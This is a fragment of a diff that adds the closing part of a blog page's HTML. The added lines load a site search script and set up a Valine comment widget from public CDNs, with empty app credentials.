+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
